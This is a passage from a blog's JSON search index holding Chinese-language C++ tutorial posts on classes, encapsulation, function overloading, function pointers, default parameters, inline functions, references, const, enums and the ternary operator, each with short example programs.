0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类分成多文件","slug":"cpp0018-类分成多文件","date":"2021-04-26T10:10:39.000Z","updated":"2021-12-28T18:35:35.046Z","comments":true,"path":"2021/04/26/cpp0018-类分成多文件/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0018-类分成多文件/","excerpt":"","text":"类分成多文件 circle.h 12345678910111213141516171819#pragma onceclass Circle&#123;public: void setR(double r); double getR(); double getArea(); double getGirth();private: double m_R; double m_area; double m_girth;&#125;; circle.cpp 在类的外部创建类方法需要使用作用域名; 函数类型 类名::类方法(函数形参) 12345678910111213141516171819202122#include \"Circle.h\"double Circle::getArea() &#123; m_area = 3.14 * m_R * m_R; return m_area;&#125;double Circle::getGirth() &#123; m_girth = 2 * 3.14 * m_R; return m_girth;&#125;double Circle::getR() &#123; return m_R;&#125;void Circle::setR(double r)&#123; m_R = r;&#125; main.cpp 使用Circle类需要引用类头文件#include&quot;Circle.h&quot; 1234567891011121314#include&lt;iostream&gt;#include\"Circle.h\"using namespace std;int main(int argc, char* argv[])&#123; Circle c; c.setR(10.0); cout &lt;&lt; c.getArea() &lt;&lt; endl; cout &lt;&lt; c.getGirth() &lt;&lt; endl; cout &lt;&lt; c.getR() &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类的封装","slug":"cpp0017-类的封装","date":"2021-04-24T20:24:57.000Z","updated":"2021-12-28T18:35:32.019Z","comments":true,"path":"2021/04/25/cpp0017-类的封装/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/25/cpp0017-类的封装/","excerpt":"","text":"类的封装 面向对象有三大特点， 封装，继承，多态 C++将struct 做了功能的增强，struct实际上就是一个class 只不过struct的类的内部，默认的访问控制权限是public class 的类的内部，默认的访问控制权限是private 输入年月日,并判断是否是闰年 封装前 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;struct Date&#123; int year; int month; int day;&#125;;//初始化这个结构体void init(struct Date &amp; date)&#123; cout &lt;&lt; \"year, month, day\" &lt;&lt; endl; cin &gt;&gt; date.year; cin &gt;&gt; date.month; cin &gt;&gt; date.day;&#125;//打印此结构体void printDate(struct Date &amp;date)&#123; cout &lt;&lt; \"日期是\" &lt;&lt; date.year &lt;&lt; \"年\" &lt;&lt; date.month &lt;&lt; \"月\" &lt;&lt; date.day &lt;&lt; \"日\" &lt;&lt; endl;&#125;//判断是否为闰年bool isLeapYear(struct Date &amp;date)&#123; if (((date.year % 4 == 0) &amp;&amp; (date.year % 100 != 0)) || (date.year % 400 == 0)) &#123; return true; &#125; else &#123; return false; &#125;&#125;void test1()&#123; struct Date date; //传统的C语言开发，面向过程的， 是一个一个函数来操作， C语种最小单元是一个函数 init(date); printDate(date); if (isLeapYear(date) == true) &#123; cout &lt;&lt; \"是闰年\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"不是闰年\" &lt;&lt; endl; &#125;&#125;int main()&#123; test1(); return 0;&#125; 封装后 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class MyDate&#123; //类的&#123;&#125;中的所有区域称为 类的 内部， 除了&#123;&#125;区域以外都是 类的外部public://访问控制权限 //在public标识符下面定义的成员变量和成员函数 均可以在类的外部和类的内部 访问 int getYear() &#123; return year; &#125; void init() &#123; cout &lt;&lt; \"year, month, day\" &lt;&lt; endl; cin &gt;&gt; year; cin &gt;&gt; month; cin &gt;&gt; day; &#125; //成员函数 bool isLeapYear() &#123; if (((year % 4 == 0) &amp;&amp; (year % 100 != 0)) || (year % 400 == 0)) &#123; return true; &#125; else &#123; return false; &#125; &#125; void printDate() &#123; cout &lt;&lt; \"日期是\" &lt;&lt; year &lt;&lt; \"年\" &lt;&lt; month &lt;&lt; \"月\" &lt;&lt; day &lt;&lt; \"日\" &lt;&lt; endl; &#125;protected://如果是单个类， 跟private是一样的。 在类的内部能够访问，在类的外部不能够访问private://在private 访问控制符 下定义的成员变量和成员函数 只能在类的内部访问 int month; int day; int year;&#125;;void test2()&#123; MyDate date; //通过MyDate 类 实例化一个对象 //c++中 是面向对象进行开发，所有方法都封装在类中， 通过一个一个的对象进行编程。 date.init(); if (date.isLeapYear() == true) &#123; cout &lt;&lt; \"是闰年\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"不是闰年\" &lt;&lt; endl; &#125; //cout &lt;&lt;\"年\"&lt;&lt; date.year &lt;&lt; endl; cout &lt;&lt; \"年\" &lt;&lt; date.getYear() &lt;&lt; endl; /* date.year = 2005;//在类的外部修改了成员变量 date.month; date.day; */&#125;int main(void)&#123; //test1(); test2(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类的基本概念","slug":"cpp0016-类的基本概念","date":"2021-04-24T20:01:19.000Z","updated":"2021-12-28T18:35:28.608Z","comments":true,"path":"2021/04/25/cpp0016-类的基本概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/25/cpp0016-类的基本概念/","excerpt":"","text":"类的基本概念 类的定义 123class className&#123;类成员变量或方法&#125;; 类方法可以直接调用类成员变量或方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;iostream&gt;using namespace std;class Animal &#123;public: char name[64]; char color[64]; void run() &#123; cout &lt;&lt; name &lt;&lt; \"跑起来了\" &lt;&lt; endl; &#125; void write() &#123; cout &lt;&lt; name &lt;&lt; \"写字了\" &lt;&lt; endl; &#125; void print() &#123; cout &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; color &lt;&lt; endl; &#125;private: int id;&#125;;int main(int argc, char* argv[])&#123; Animal dog, cat; strcpy(dog.color, \"yellow\"); strcpy(dog.name, \"xiaoming\"); strcpy(cat.name, \"xiaohua\"); strcpy(cat.color, \"black\"); dog.print(); cat.print(); dog.run(); dog.write(); cat.run(); cat.write(); return 0;&#125; public 公有的,类的外部可以直接调用 private私有的,类的外部不可以直接调用,可以通过方法get或set protected保护的,在类的外部调用不到,子类可以调用","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"函数重载","slug":"cpp0014-函数重载","date":"2021-04-22T16:12:36.000Z","updated":"2021-12-28T18:35:17.538Z","comments":true,"path":"2021/04/23/cpp0014-函数重载/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/23/cpp0014-函数重载/","excerpt":"","text":"函数重载 函数重载(Function Overload)：用同一个函数名定义不同的函数，当函 数名和不同的参数搭配时函数的含义不同。 重载规则 1,函数名相同。 2,参数个数不同,参数的类型不同,参数顺序不同,均可构成重载。 3,返回值类型不影响重载。 调用准则 1,严格匹配,找到则调用。 2,通过隐式转换寻求一个匹配,找到则调用。 编译器调用重载函数的准则: 1.将所有同名函数作为候选者 2.尝试寻找可行的候选函数 3.精确匹配实参 4.通过默认参数能够匹配实参 5.通过默认类型转换匹配实参 6.匹配失败 7.最终寻找到的可行候选函数不唯一，则出现二义性，编译失败。 8.无法匹配所有候选者，函数未定义，编译失败。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//决定一个函数的 1 返回值， 2 参数列表void func(int a)//void (*fp)(int)&#123; cout &lt;&lt; \"func1 \" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;//函数重载 是对一种函数的 添加的 意义， 对一个函数名 添加多中不同的实现 （+）//函数重载， 就是对参数列表的 变换不是 函数返回值的变化//返回值必须一样，参数列表不同， 并且函数名 相同的函数 都是重载函数//void func(int a, int b = 10)void func(int a, int b )&#123; cout &lt;&lt; \"func2\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; \",\" &lt;&lt;b &lt;&lt; endl;&#125;//如果函数 完全相同 也不是一个函数重载/*void func(int a, int b)&#123;&#125;*/void func(int a, int b, char *str)&#123; cout &lt;&lt; \"func3\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; \", \" &lt;&lt; b &lt;&lt; \", \" &lt;&lt; str &lt;&lt; endl;&#125;//返回值类型不同，不能构成重载/*char func()&#123;&#125;*/void print(double a)&#123; cout &lt;&lt; \"print double \" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;void print(float a)&#123; cout &lt;&lt;\"print float\" &lt;&lt;endl; cout &lt;&lt;a &lt;&lt;endl;&#125;#if 0void print(int a)&#123; cout &lt;&lt; \"print int\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;void print(char a)&#123; cout &lt;&lt; \"print char\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;#endifint main(void)&#123; //定义一个 指向void func(int a)的函数指针 //void(*fp)(int) = func;//fp 就是执行 void()(int) 这种函数类型的指针 //fp(10); func(10); //编译器 会根据用户传递的参数类型和个数 进行重载函数的匹配 //如果说函数重载 加上了默认参数， 回导致调用函数的时候出现二义性， //记住： 函数重载 最好不要有默认参数， func(10, 20); func(10, 20, \"abc\"); //print(10); //void print(int a) //print(1.1);//void print(double a) //print(1.1f); // 经过隐式转换 会调用void print(double a) //print('a'); //经过隐式转化， 'a' -&gt;int void print(int a) //print(\"asbdasd\"); //1 严格进行参数列表匹配 //2 如果隐式转换可以找到匹配 那么依然可以调用 //3 如果匹配不到， 直接报错。 return 0;&#125; 重载底层实现（name mangling） C++利用 name mangling(倾轧)技术,来改名函数名,区分参数不同的同 名函数。 实现原理:用 v c i f l d表示 void char int float long double 及其引 用。 12void func(char a); // func_c(char a)void func(char a,int b,double c); //func_cid(char a,int b,double c);","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"函数重载和函数指针","slug":"cpp0015-函数重载和函数指针","date":"2021-04-22T16:12:36.000Z","updated":"2021-12-28T18:35:23.115Z","comments":true,"path":"2021/04/23/cpp0015-函数重载和函数指针/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/23/cpp0015-函数重载和函数指针/","excerpt":"","text":"函数重载和函数指针 函数重载与函数指针 当使⽤用重载函数名对函数指针进⾏行赋值时 根据重载规则挑选与函数指针参数列表⼀一致的候选者 严格匹配候选者的函数类型与函数指针的函数类型 函数指针，调用的时候是不能够发生函数重载的 函数指针基本语法 123456789101112int func(int a, int b,int c)&#123; cout &lt;&lt; \"func2\" &lt;&lt; endl; return 0;&#125;//第一种函数指针定义typedef int (My_func)(int, int);//第二种函数指针定义typedef int(*My_func2)(int, int);//第三种函数指针定义int(*fp3)(int, int) = func; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;void func(int a, int b)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; endl;&#125;void func(int a, int b, int c)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; c &lt;&lt; endl;&#125;void func(int a, int b, int c, int d)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; c &lt;&lt;d &lt;&lt; endl;&#125;//1 定义一个函数类型typedef void(myfunctype)(int, int); //定义了一个函数类型， 返回值void 参数列表是 int，int ,, void()(int,int)//2 定义一个函数指针类型 typedef void(*myfunctype_pointer)(int, int); //定义了一个函数指针类型， 返回值void 参数列表是 int，int ,, void(*)(int,int)int main(void)&#123; //1 定义一个函数指针 myfunctype * fp1 = NULL; fp1 = func; fp1(10, 20); // 2 定义一个函数指针 myfunctype_pointer fp2 = NULL; fp2 = func; fp2(10, 20); //3 直接定义一个函数指针 void(*fp3)(int, int) = NULL; fp3 = func; fp3(10, 20); cout &lt;&lt; \" -----------------\" &lt;&lt; endl; //此时的fp3 是 void(*)(int,int) //fp3(10, 30, 30); //fp3 恒定指向一个 函数入口，void func(int, int) 的函数入口 //fp3(10, 30, 40, 50); //想要通过函数指针，发生函数重载 是不可能。 fp3(10, 20); void(*fp4)(int, int, int) = func; //在堆函数指针赋值的时候，函数指针会根据自己的类型 找到一个重载函数 fp4(10, 10, 10); //fp4(10, 10, 10, 10); //函数指针，调用的时候是不能够发生函数重载的。 void(*fp5)(int, int, int, int) = func;// void func(int ,int ,int ,int ) fp5(10, 10, 10, 10); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"函数的默认参数和占位参数","slug":"cpp0013-函数的默认参数和占位参数","date":"2021-04-22T15:48:32.000Z","updated":"2021-12-28T18:35:14.748Z","comments":true,"path":"2021/04/22/cpp0013-函数的默认参数和占位参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0013-函数的默认参数和占位参数/","excerpt":"","text":"函数的默认参数和占位参数 默认参数规则 只有参数列表后面部分的参数才可以提供默认参数值 一旦在一个函数调用中开始使用默认参数值，那么这个参数后的所有参 数都必须使用默认参数值 123456789101112131415161718192021#include&lt;iostream&gt;using namespace std;int qiuLiFangTiTiJi(int l = 10, int w = 20, int h = 10)&#123; return l * w * h;&#125;int main(int argc, char* argv[])&#123; int l = 10; int w = 20; int h = 30; cout &lt;&lt; qiuLiFangTiTiJi() &lt;&lt; endl; cout &lt;&lt; qiuLiFangTiTiJi(l) &lt;&lt; endl; cout &lt;&lt; qiuLiFangTiTiJi(l, w) &lt;&lt; endl; cout &lt;&lt; qiuLiFangTiTiJi(l, w, h) &lt;&lt; endl; return 0;&#125; 占位参数 函数占位参数 占位参数只有参数类型声明，⽽而没有参数名声明 一般情况下，在函数体内部⽆无法使⽤用占位参数 12345678910111213141516171819#include&lt;iostream&gt;using namespace std;int max(int a, int b, int)&#123; return a &gt; b ? a : b;&#125;int max2(int a, int b, float = 0)&#123; return a &gt; b ? a : b;&#125;int main(int argc, char* argv[])&#123; cout &lt;&lt; max(10, 20, 30) &lt;&lt; endl; cout &lt;&lt; max2(410,330) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"内联函数","slug":"cpp0012-内联函数","date":"2021-04-22T15:30:23.000Z","updated":"2021-12-28T18:35:11.909Z","comments":true,"path":"2021/04/22/cpp0012-内联函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0012-内联函数/","excerpt":"","text":"内联函数 c 语言中有宏函数的概念。宏函数的特点是内嵌到调用代码中去,避免了 函数调用 的开销。但是由于宏函数的处理发生在预处理阶段,缺失了语法检测 和有可能带来的语意差错 特点： 1）内联函数声明时inline关键字必须和函数定义结合在一起，否则编译器会直 接忽略内联请求。 2）C编译器直接将函数体插入在函数调用的地方 。 3）内联函数没有普通函数调用时的额外开销(压栈，跳转，返回)。 4）内联函数是一种特殊的函数，具有普通函数的特征（参数检查，返回类型 等）。 5） 内联函数由 编译器处理，直接将编译后的函数体插入调用的地方， 宏代码片段 由预处理器处理， 进行简单的文本替换，没有任何编译过程。 6）C中内联编译的限制： 不能存在任何形式的循环语句 不能存在过多的条件判断语句 函数体不能过于庞大 不能对函数进行取址操作 函数内联声明必须在调用语句之前 7）编译器对于内联函数的限制并不是绝对的，内联函数相对于普通函数的优 势只是省去了函数调用时压栈，跳转和返回的开销。因此，当函数体的执行开 销远大于压栈，跳转和返回所用的开销时，那么内联将无意义。 12345678910111213141516171819#include&lt;iostream&gt;using namespace std;//内联函数inline int Max(int a, int b)&#123; return a &gt; b ? a : b;&#125;int main(int argc, char* argv[])&#123; int a = 100; int b = 20; int max = Max(a, b); cout &lt;&lt; max &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"const引用","slug":"cpp0011-const引用","date":"2021-04-22T15:26:26.000Z","updated":"2021-12-28T18:35:07.946Z","comments":true,"path":"2021/04/22/cpp0011-const引用/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0011-const引用/","excerpt":"","text":"const引用 1234567891011121314151617181920212223242526272829303132333435363738394041#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//const引用一般用在形参上，来限制 被引用的变量不能被修改，void printX(const int &amp; re )&#123; cout &lt;&lt; \"re \" &lt;&lt; re &lt;&lt; endl;&#125;int main(void)&#123; const int a = 10; // a必须初始化 //int &amp; b = a; const int &amp;b = a; //如果是一个const 常量， 必须用const 引用来接收它 int x = 3.14; const int &amp;re1 = x; cout &lt;&lt; \"re1 \" &lt;&lt; re1 &lt;&lt; endl; x = 20; cout &lt;&lt; \"re1 \" &lt;&lt; re1 &lt;&lt; \", x: \" &lt;&lt; x &lt;&lt; endl; const int &amp;re2 = 10;// 用const 引用 引用一个字面量 // 当用一个const 引用 去引用一个字面量的时候， 字面量他是没有地址， //引用是无法 对字面量取地址的， 临时创建一个 int temp， 10 ---&gt;temp //const int &amp;re2 = temp; //用re2 就是代表 temp，re2是const的引用，你无法去改变temp的值 //int &amp;re2 = 10; //非常量引用 必须是左值。 左值就是可以放在=左边的表达式，左值是可以赋值，是有内存空间的 //如果想对一个字面量做引用的话，只能用 const 的引用 cout &lt;&lt; \"re2 = \" &lt;&lt; re2 &lt;&lt; endl; cout &lt;&lt; \"sizeof(re2)\" &lt;&lt; sizeof(re2) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"指针引用","slug":"cpp0010-指针引用","date":"2021-04-22T15:15:14.000Z","updated":"2021-12-28T18:35:03.673Z","comments":true,"path":"2021/04/22/cpp0010-指针引用/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0010-指针引用/","excerpt":"","text":"指针引用 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;#include&lt;cstdlib&gt;using namespace std;int my_malloc(int num,int **pp)&#123; *pp = (int *)malloc(num); return 0;&#125;//指针引用做函数参数,优化二级指针int my_malloc2(int num, int * &amp;pp)//pp 代表 *pp&#123; pp = (int *)malloc(num); return 0;&#125;int main(int argc, char* argv[])&#123; int *p = NULL; my_malloc(100, &amp;p); cout &lt;&lt; p &lt;&lt; endl; free(p); p = NULL; cout &lt;&lt; \"------------------------------------\" &lt;&lt; endl; my_malloc2(4, p); *p = 4; cout &lt;&lt; *p &lt;&lt; endl; free(p); p = NULL; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"引用的本质","slug":"cpp0009-引用的本质","date":"2021-04-22T14:28:42.000Z","updated":"2021-12-28T18:34:59.864Z","comments":true,"path":"2021/04/22/cpp0009-引用的本质/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0009-引用的本质/","excerpt":"","text":"引用的本质 在研究引用的时候 ，可以将引用理解为 一个 常指针 在理解引用的时候， 可以将引用理解为 一个变量的别名 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;struct TypeA&#123; int *a;&#125;;struct TypeB&#123; double &amp;a;&#125;;struct Teacher&#123; int id; char name[64];&#125;;void motifyTeacher(Teacher &amp;t) //&#123; t.id = 100; // 如果说t是一个常指针， *t 就是指针指向内存空间 (*t).id = 100 //当你要试图修改或者获取已经初始化的引用的时候， 编译器会有一个隐藏的*的操作&#125;void motifyA(int *const a) //常指针 也是一个常量， 也是必须要初始化， 也不能被修改&#123; *a = 100;&#125;void motifyB(int &amp;a)&#123; a = 1000; //a 实际上是一个常量指针， 但是如果你给一个a赋值，编译器会有一个隐形的操作， *&#125;//在研究引用的时候 ，可以将引用理解为 一个 常指针//在理解引用的时候， 可以将引用理解为 一个变量的别名void test()&#123; int value = 20; Teacher t1 = &#123; 1, \"zhangsan\" &#125;; motifyA(&amp;value); cout &lt;&lt; \"value = \" &lt;&lt; value &lt;&lt; endl; motifyB(value); // int value --&gt; int &amp;a , int&amp; a = value 给引用指定指向哪个变量的时候， 编译器提供又有了一个隐形的操作 // a = &amp;value; cout &lt;&lt; \"value = \" &lt;&lt; value &lt;&lt; endl; motifyTeacher(t1); //如果说 motifyTeacher 的形参是一个常指针，Teacher *const t = &amp;t1; //编译器发现 Teacher &amp;t 形参是一个引用， Teacher &amp;t = &amp;t1; //当给引用初始化的时候， 会有一个&amp; 的隐形操作&#125;void motifyAA(int *a)&#123; *a = 100; //间接的赋值&#125;void motifyBB(int &amp;a) //int &amp;a = a; a = &amp;a;&#123; a = 200; //*a = 200&#125;void test2()&#123; int a = 10; //条件一 motifyAA(&amp;a); //int*a = &amp;a; //建立了关联 motifyBB(a);&#125;int main(void)&#123; int a = 10; int b = 20; const int c_a = 10; //c_a = 20;//常量在初始化之后，不能够再修改了 int &amp;re = a; //引用必须初始化. 引用在初始化之后，也不能够被改变 re = b; // a = b 而不是 让re引用指向b cout &lt;&lt; \"re = \" &lt;&lt; re &lt;&lt; endl; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; re = 100; //是该的a 还是b？ cout &lt;&lt; \"re = \" &lt;&lt; re &lt;&lt; endl; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; //1 引用 可能是一个 常量？ cout &lt;&lt; \"sizeof(TypeA): \" &lt;&lt; sizeof(TypeA) &lt;&lt; endl; cout &lt;&lt; \"sizeof(TypeB):\" &lt;&lt; sizeof(TypeB) &lt;&lt; endl; //通过对引用求大小， 发现不管引用是什么类型 都是4个字节，都跟指针的大小一样。 //2 引用可能是一个 指针？ test(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"引用的基本概念","slug":"cpp0008-引用的基本概念","date":"2021-04-22T13:35:32.000Z","updated":"2021-12-28T18:34:56.418Z","comments":true,"path":"2021/04/22/cpp0008-引用的基本概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0008-引用的基本概念/","excerpt":"","text":"引用的基本概念 给变量起别名 规则 1 引用没有定义,是一种关系型声明。声明它和原有某一变量(实体)的关 系。故 而类型与原类型保持一致,且不分配内存。与被引用的变量有相同的地 址。 123456789101112131415#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a = 100; int &amp; re = a; cout &lt;&lt; \"&amp;a = \" &lt;&lt; &amp;a &lt;&lt; endl; cout &lt;&lt; \"&amp;re = \" &lt;&lt; &amp;re &lt;&lt; endl; return 0;&#125; 2 声明的时候必须初始化,一经声明,不可变更。 12345678910111213#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a = 100; //int &amp;re; //Error int &amp;re = a; cout &lt;&lt; re &lt;&lt; endl; return 0;&#125; 3 可对引用,再次引用。多次引用的结果,是某一变量具有多个别名。 123456789101112131415161718#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a = 100; //int &amp;re; //Error int &amp;re = a; int &amp;re2 = re; cout &lt;&lt; re &lt;&lt; endl; cout &lt;&lt; re2 &lt;&lt; endl; cout &lt;&lt; &amp;a &lt;&lt; endl; cout &lt;&lt; &amp;re &lt;&lt; endl; cout &lt;&lt; &amp;re2 &lt;&lt; endl; return 0;&#125; 4 &amp;符号前有数据类型时,是引用。其它皆为取地址。 引用做函数参数或函数返回值 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include&lt;iostream&gt;using namespace std;typedef struct student&#123; char name[50]; float score; int sex;&#125;Student;//交换两个变量的值int my_swap(int &amp;a, int &amp;b)&#123; int tem = a; a = b; b = tem; return 0;&#125;//打印结构体变量Student &amp; my_print(Student &amp;a)&#123; cout &lt;&lt; a.name &lt;&lt; endl; cout &lt;&lt; a.score &lt;&lt; endl; cout &lt;&lt; a.sex &lt;&lt; endl; return a;&#125;int main(int argc, char* argv[])&#123; Student XiaoMing = &#123; \"XiaoMing\",100.0f,1 &#125;; int a = 100, b = 90; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; \"--------------------------------\" &lt;&lt; endl; my_swap(a, b); my_print(XiaoMing); cout &lt;&lt; \"--------------------------------\" &lt;&lt; endl; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"枚举的增强","slug":"cpp0007-枚举的增强","date":"2021-04-15T15:10:03.000Z","updated":"2021-12-28T18:34:52.456Z","comments":true,"path":"2021/04/15/cpp0007-枚举的增强/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0007-枚举的增强/","excerpt":"","text":"枚举的增强 1234567891011121314151617181920212223#include&lt;iostream&gt;using namespace std;enum Son &#123; xiaom, xiaoh, xiaol, xiaolan,&#125;;int main(int argc, char* argv[])&#123; //可以省略enum关键字不写 Son house = xiaom; //c++中,枚举变量只能用枚举常量来赋值 //house = 1; cout &lt;&lt; house &lt;&lt; endl; cin.get(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"const的增强","slug":"cpp0006-const的增强","date":"2021-04-15T14:19:28.000Z","updated":"2022-05-30T16:05:16.359Z","comments":true,"path":"2021/04/15/cpp0006-const的增强/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0006-const的增强/","excerpt":"","text":"const的增强 const int * a表示指针指向的内存空间不可以修改 int * const a表示不能修改a的指向 const int * const a 表示a的内存和a所指向的内存都不可以修改 1234567891011121314151617181920212223#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; //在c语言中a是一个假常量,c++中a是一个真的常量,只不过在编译阶段完成,而不是预处理阶段 const int a = 100; //创建一个临时变量的地址赋值给p1,所以修改*p1时,a不会改变 int * p1 = (int *)&amp;a; //c++中const修饰过的整型变量可以声明数组,c语言不可以 int array[a] = &#123; 0 &#125;; *p1 = 1; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"*p1 = \" &lt;&lt; *p1 &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"三目运算符的加强","slug":"cpp0005-三目运算符的加强","date":"2021-04-14T17:53:25.000Z","updated":"2021-12-28T18:34:44.328Z","comments":true,"path":"2021/04/15/cpp0005-三目运算符的加强/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0005-三目运算符的加强/","excerpt":"","text":"三目运算符的加强 1234567891011121314151617181920#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a, b; a = 10; b = 20; //三目运算符可以用作左值,返回的是a或b的引用 //c语言则不行,除非这样写(a &gt; b ? &amp;a : &amp;b) = 100; (a &gt; b ? a : b) = 100; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; cin.get(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"C++语言对C的增强和bool","slug":"cpp0004-C-语言对C的增强和bool","date":"2021-04-14T17:53:25.000Z","updated":"2021-12-28T18:34:40.976Z","comments":true,"path":"2021/04/15/cpp0004-C-语言对C的增强和bool/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0004-C-语言对C的增强和bool/","excerpt":"","text":"C++语言对C的增强和bool 变量定义 c语言:早期版本中规定要定义在函数首部 c++:在函数内随便一个位置都可以 c对定义全局变量的检测能力增强了,c语言在同一个地方可以定义多次重名的全局变量,c不可以. 123456789101112131415161718192021#include&lt;stdio.h&gt;int g_a;int g_a = 2;/*c语言会处理成:int g_a;g_a = 2;*/int main(int argc, char* argv[])&#123; return 0;&#125; struct的类型增强 C++定义struct变量时可以不用加struct关键字 1234567891011121314#include&lt;iostream&gt;using namespace std;struct student &#123; float score;&#125;;int main(int argc, char* argv[])&#123; //可以不用加struct关键字 student xiaoming; return 0;&#125; C++不可以没有函数类型,c语言可以没有函数类型,默认是int C++填写函数参数必须是对应个数,C语言可以不对应 12345678910111213141516171819#include&lt;stdio.h&gt;//c语言可以没有函数类型,默认为intfun()&#123; return 0;&#125;fun1(int a) &#123; return 0;&#125;int main(int argc, char* argv[])&#123; //传入过多的参数,c语言也不会出错 fun1(1,2,3,4,5,61,2); return 0;&#125; C++引入了bool类型来表示true和false 1234567891011121314#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; bool flag = true; cout &lt;&lt; (bool)flag &lt;&lt; endl; cout &lt;&lt; sizeof(flag) &lt;&lt; endl; cout &lt;&lt; 